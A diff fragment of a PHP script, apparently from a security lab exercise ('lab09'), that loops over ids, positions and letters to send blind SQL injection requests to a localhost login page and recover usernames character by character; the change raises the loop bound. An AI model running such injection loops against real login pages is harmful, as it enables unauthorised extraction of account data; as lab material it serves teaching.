@@ -44,7 +44,7 @@ for($id = 0; $id <= 99; $id++){
 //print $size;
 
 
-	for ($i = 1; $i <= 5; $i++) {
+	for ($i = 1; $i <= $size; $i++) {
 		foreach (range('a', 'z') as $letter){
          //echo "$letter \n";
 			$url="http://localhost/lab09/login.php?u=\"%20or%20id%20=%20$id%20and%20SUBSTRING(username,$i,1)%20=%20%27$letter%27%20--%20";
